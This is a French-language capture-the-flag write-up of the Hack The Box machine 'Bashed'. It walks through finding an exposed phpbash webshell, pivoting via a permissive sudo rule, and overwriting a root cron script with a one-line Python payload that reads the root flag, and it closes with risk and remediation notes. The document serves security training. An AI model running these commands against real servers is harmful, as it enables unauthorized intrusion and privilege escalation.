# HTB — Bashed Write-up

- **Machine :** Bashed
- **Plateforme :** Hack The Box
- **OS :** Linux
- **Difficulté :** Easy
- **IP :** 10.129.5.182

---

## Description

Bashed s'exploite via un **webshell PHP laissé en clair** dans un répertoire du serveur (`/dev/phpbash.php`), un outil de développement/debug oublié en production. Ce type de faille s'inscrit dans le *workflow* de déploiement de l'application : des fichiers d'administration/debug non destinés à la production restent accessibles publiquement et offrent une exécution de commandes arbitraire sans authentification. La privesc exploite ensuite une **règle sudo NOPASSWD** permettant de devenir `scriptmanager`, puis un **cron root** qui exécute un script appartenant à `scriptmanager` — on injecte du code dans ce script pour qu'il s'exécute en root.

---

## Exploitation

### 1. Reconnaissance

```bash
nmap -p- 10.129.5.182
```

Un seul port ouvert :

| Port | Service | Version       |
|------|---------|---------------|
| 80   | HTTP    | Apache 2.4.18 |

### 2. Fuzzing de répertoires (Gobuster)

```bash
gobuster dir -u http://10.129.5.182/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt
```

Découverte clé : le répertoire `/dev`, qui contient :

```
/dev/phpbash.php
```

C'est un **webshell PHP** (phpbash) — une console interactive exécutable directement dans le navigateur.

### 3. Accès initial (foothold)

Ouverture de `http://10.129.5.182/dev/phpbash.php` → shell interactif dans le navigateur.

```bash
whoami
# www-data
```

```bash
cat /home/arrexel/user.txt
```

### 4. Élévation de privilèges — étape 1 : www-data → scriptmanager

Vérification des droits sudo :

```bash
sudo -l
```

Résultat :

```
(scriptmanager) NOPASSWD: ALL
```

`www-data` peut exécuter n'importe quelle commande en tant que `scriptmanager`, sans mot de passe.

```bash
sudo -u scriptmanager ls -la /scripts
```

Résultat :

```
test.py    → propriété de scriptmanager
test.txt   → propriété de root, horodatage récent
```

Le signal clé : `test.txt` appartient à root et son horodatage change régulièrement, ce qui trahit un cron root exécutant `test.py`. Or `test.py` appartient à `scriptmanager`, que l'on contrôle déjà.

### 5. Élévation de privilèges — étape 2 : scriptmanager → root (cron hijack)

`test.py` est modifiable par nous mais exécuté par root. On réécrit son contenu (en une seule ligne, phpbash ne gérant pas bien le multi-ligne) pour qu'il exfiltre le flag root :

```bash
sudo -u scriptmanager bash -c 'echo "import os; os.system(\"cat /root/root.txt > /tmp/flag.txt; chmod 644 /tmp/flag.txt\")" > /scripts/test.py'
```

Vérification du payload en place :

```bash
sudo -u scriptmanager cat /scripts/test.py
```

Après ~1 minute (passage du cron) :

```bash
cat /tmp/flag.txt
```

---

## PoC

**Accès webshell :**

```http
GET /dev/phpbash.php HTTP/1.1
Host: 10.129.5.182
```

**Pivot sudo :**

```bash
sudo -l
sudo -u scriptmanager ls -la /scripts
```

**Injection dans le script exécuté par le cron root :**

```bash
sudo -u scriptmanager bash -c 'echo "import os; os.system(\"cat /root/root.txt > /tmp/flag.txt; chmod 644 /tmp/flag.txt\")" > /scripts/test.py'
cat /tmp/flag.txt
```

---

## Risk

- **Webshell exposé sans authentification** : n'importe quel visiteur peut exécuter des commandes arbitraires sur le serveur avec les privilèges de `www-data`, ce qui constitue une exécution de code à distance non authentifiée.
- **Règle sudo `NOPASSWD: ALL` trop permissive** : elle transforme un accès `www-data` limité en un accès complet au compte `scriptmanager`, sans aucune barrière.
- **Processus privilégié exécutant un fichier modifiable par un utilisateur moins privilégié** : le cron root exécutant `/scripts/test.py` (modifiable par `scriptmanager`) permet une élévation directe jusqu'à root.
- **Impact global** : compromission complète de la machine (root), avec accès à toutes les données et possibilité de persistance/mouvement latéral.

---

## Remediation

- Retirer tout outil de développement/debug (webshells, consoles interactives type phpbash, `phpinfo()`, backups) des environnements de production, et s'assurer qu'ils ne sont jamais déployés par erreur (pipeline CI/CD, `.gitignore`, revue de déploiement).
- Restreindre les règles sudo au strict nécessaire : éviter `NOPASSWD: ALL` vers un autre compte ; n'autoriser que les binaires/scripts précis requis par le besoin métier.
- Ne jamais faire exécuter par un processus privilégié (cron, systemd timer, service root) un fichier modifiable par un utilisateur moins privilégié ; appliquer des permissions strictes (root:root, 700) sur les scripts exécutés par cron root.
- Auditer régulièrement les tâches cron root et leurs dépendances (fichiers, PATH) pour détecter ce type de détournement possible.

---

## Résumé

**Machine :** Bashed
**Vulnérabilité principale :** Webshell PHP exposé + sudo NOPASSWD trop permissif + cron root exécutant un fichier modifiable
**Accès initial :** Webshell `phpbash.php` (www-data)
**Privilèges obtenus :** Root

**Flags :**
- User : récupéré via `cat /home/arrexel/user.txt`
- Root : récupéré via `cat /tmp/flag.txt` après détournement du cron

**Outils utilisés :** `nmap` · `gobuster` · navigateur (phpbash) · `sudo` · `cron`
